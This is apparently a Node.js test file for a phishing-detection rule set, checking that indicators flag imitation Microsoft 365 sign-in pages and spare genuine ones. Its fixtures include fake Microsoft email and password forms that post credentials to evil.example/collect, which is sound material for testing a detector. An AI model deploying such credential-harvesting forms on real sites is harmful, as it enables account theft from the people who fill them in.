import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";

const rules = JSON.parse(
  readFileSync(new URL("../../rules/detection-rules.json", import.meta.url), "utf8")
);

function indicator(id) {
  const found = rules.phishing_indicators.find((entry) => entry.id === id);
  assert.ok(found, `missing indicator ${id}`);
  return found;
}

function matches(id, html) {
  const entry = indicator(id);
  return new RegExp(entry.pattern, entry.flags || "i").test(html);
}

const emailStep = `<!DOCTYPE html>
<html>
<body>
  <div>Microsoft</div>
  <form method="post" action="https://evil.example/collect">
    <input type="email" name="loginfmt" id="i0116" placeholder="Email, phone, or Skype">
    <input type="submit" id="idSIButton9" value="Next">
  </form>
</body>
</html>`;

const passwordStep = `<!DOCTYPE html>
<html>
<head>
  <style>
    body { font-family: Segoe UI; background-color: #0067b8; max-width: 440px; }
  </style>
</head>
<body>
  <h1>Microsoft</h1>
  <form method="post" action="https://evil.example/collect">
    <input type="password" name="passwd" placeholder="Password">
    <input type="submit" value="Sign in">
  </form>
</body>
</html>`;

function countM365Evidence(html) {
  const requirements = rules.m365_detection_requirements;
  const elements = [
    ...(requirements.primary_elements || []),
    ...(requirements.secondary_elements || []),
  ];
  let primaryFound = 0;
  let totalWeight = 0;
  let totalElements = 0;

  for (const element of elements) {
    let found = false;
    if (element.type === "source_content") {
      found = new RegExp(element.pattern, "i").test(html);
    } else if (element.type === "css_pattern") {
      found = element.patterns.some((pattern) =>
        new RegExp(pattern, "i").test(html)
      );
    }
    if (found) {
      totalElements += 1;
      totalWeight += element.weight || 1;
      if (element.category === "primary") primaryFound += 1;
    }
  }

  const thresholds = requirements.detection_thresholds;
  const isM365Page =
    primaryFound > 0
      ? primaryFound >= thresholds.minimum_primary_elements &&
        totalWeight >= thresholds.minimum_total_weight &&
        totalElements >= thresholds.minimum_elements_overall
      : totalWeight >= thresholds.minimum_secondary_only_weight &&
        totalElements >= thresholds.minimum_secondary_only_elements;
  const hasMicrosoftElements =
    primaryFound > 0 ||
    totalWeight >= 4 ||
    (totalElements >= 3 && totalWeight >= 3);

  return { isM365Page, hasMicrosoftElements, primaryFound, totalWeight, totalElements };
}

test("multiline Microsoft email step is not a full logon page but matches phi_010", () => {
  const evidence = countM365Evidence(emailStep);
  assert.equal(evidence.isM365Page, false);
  assert.equal(evidence.hasMicrosoftElements, true);
  assert.equal(matches("phi_010_aad_fingerprint", emailStep), true);
});

test("multiline Microsoft password step is not a full logon page but matches phi_013", () => {
  const evidence = countM365Evidence(passwordStep);
  assert.equal(evidence.isM365Page, false);
  assert.equal(evidence.hasMicrosoftElements, true);
  assert.equal(matches("phi_013_form_action_mismatch", passwordStep), true);
  assert.equal(matches("phi_006", passwordStep), true);
});

test("same indicators still match when the markup is minified to one line", () => {
  const emailLine = emailStep.replace(/\s+/g, " ");
  const passwordLine = passwordStep.replace(/\s+/g, " ");
  assert.equal(matches("phi_010_aad_fingerprint", emailLine), true);
  assert.equal(matches("phi_013_form_action_mismatch", passwordLine), true);
});

test("a real Microsoft login action suppresses the critical cross-line indicators", () => {
  const legitimate = emailStep.replace(
    "https://evil.example/collect",
    "https://login.microsoftonline.com/common/oauth2/authorize"
  );
  assert.equal(matches("phi_010_aad_fingerprint", legitimate), false);
  const legitimatePassword = passwordStep.replace(
    "https://evil.example/collect",
    "https://login.microsoftonline.com/common/oauth2/authorize"
  );
  assert.equal(matches("phi_013_form_action_mismatch", legitimatePassword), false);
});

test("customcss from the Microsoft CDN on another line is not a hijack", () => {
  const html = `<link href="https://cdn.example/customcss.css">\n<link href="https://aadcdn.msftauthimages.net/theme.css">`;
  assert.equal(matches("phi_012_suspicious_resources", html), false);
  const hijack = `<link href="https://cdn.example/customcss.css">\n<link href="https://evil.example/theme.css">`;
  assert.equal(matches("phi_012_suspicious_resources", hijack), true);
});

test("cross-line indicator checks stay linear on a large page", () => {
  const line = `<div>${"word ".repeat(400)}\nmicrosoft password action=\n</div>`;
  const html = line.repeat(40);
  assert.ok(html.length > 70000);
  const started = Date.now();
  for (const id of [
    "phi_006",
    "phi_010_aad_fingerprint",
    "phi_011_missing_elements",
    "phi_012_suspicious_resources",
    "phi_013_form_action_mismatch",
  ]) {
    matches(id, html);
  }
  const elapsed = Date.now() - started;
  assert.ok(elapsed < 100, `indicator scan took ${elapsed}ms`);
});
